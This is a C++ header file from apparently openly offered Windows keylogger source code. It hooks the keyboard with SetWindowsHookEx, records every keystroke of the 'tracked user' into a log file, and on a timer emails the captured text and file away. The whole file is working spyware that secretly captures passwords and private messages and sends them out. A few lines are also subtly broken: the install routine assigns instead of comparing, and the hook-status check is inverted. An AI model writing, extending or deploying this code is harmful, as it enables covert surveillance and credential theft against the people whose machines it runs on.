// In charge of tracking keystrokes
#ifndef KEYBHOOK_H
#define KEYBHOOK_H

#include <iostream>
#include <fstream>
#include "windows.h"
#include "KeyConstants.h"
#include "Timer.h"
#include "SendMail.h"

std::string keylog = "";

// Sends emails in a specified time intervals
void TimerSendMail(){

    // Checks if anything has been written
    if (keylog.empty())
        return;
    std::string last_file = IO::WriteLog(keylog);

    // File is empty or missing
    if(last_file.empty()){
        Helper::WriteAppLog("File creation was not successful. Keylog '" + keylog + "'");
        return;
    }

    // Subject, body, attachments
    int x = Mail::SendMail ("Log [" + last_file + "]",
                            "Hi :) \nThe file has been attached to this mail :)"
                            "\nFor testing, enjoy:\n" + keylog,
                            IO::GetOurPath(true) + last_file);

    // Mail sending has failed
    if (x != 7)
        Helper::WriteAppLog("Mail was not sent! Error code: " + Helper::ToString(x));
    else
        keylog = "";        // Clear contents of the keylogger
}

// This is the timer that will send the mail in a certain time interval
Timer MailTimer(TimerSendMail, 250 * 60, Timer::Infinite);

// HOOK function
HHOOK eHook = NULL;

LRESULT OurKeyboardProc (int nCode, WPARAM wparam, LPARAM lparam){
    if (nCode < 0)
        CallNextHookEx (eHook, nCode, wparam, lparam);

    // Pointer to the struct of DWORDs
    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT * ) lparam;

    // Checks to see if the tracked user has pressed a key or held down a key
    if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN){
        keylog += Keys::KEYS[kbs->vkCode].Name;
        if (kbs->vkCode == VK_RETURN)  // If user his ENTER key
            keylog += '\n';                            // keylog will not store the new line character,
                                                             // but rather skips to the new line in the text file
    }

    // Checks to see if the key is up
    // [SHIFT] [a] [b] [c] [/SHIFT] [r] [z] [t]
    // a, b, and c are uppercase
    // r, z, and t are lowercase
    else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP){
        DWORD key = kbs -> vkCode;
        if (key == VK_CONTROL
            || key == VK_LCONTROL
            || key == VK_RCONTROL
            || key == VK_LSHIFT
            || key == VK_RSHIFT
            || key == VK_MENU
            || key == VK_LMENU
            || key == VK_RMENU
            || key == VK_CAPITAL
            || key == VK_NUMLOCK
            || key == VK_LWIN
            || key == VK_RWIN
            ){
                // Store values into KeyName
                std::string KeyName = Keys::KEYS[kbs ->vkCode].Name;
                KeyName.insert(1, "/");
                keylog  += KeyName;
        }
    }

    // Propagate the keys to the system
    return CallNextHookEx(eHook, nCode, wparam, lparam);
}

// Installs the hook function to the keyboard
// Start timer asynchronously
bool InstallHook(){
    Helper::WriteAppLog("Hook started.. Timer started.");
    MailTimer.Start(true);

    // Every time the user presses a key, the HOOKPROC will use a handle to capture
    // those keys
    eHook = SetWindowsHookEx (WH_KEYBOARD_LL,
                              (HOOKPROC)OurKeyboardProc, GetModuleHandle (NULL), 0);

    return (eHook = NULL);
    }

// Unhook all keyboard events
// Stop all keylogging functions
bool UninstallHook (){
    BOOL b = UnhookWindowsHookEx (eHook);
    eHook = NULL;
    return (bool) b;
}

// Checks to see if the hook is working
bool IsHooked(){return (bool) (eHook == NULL);}

#endif // KEYBHOOK_H
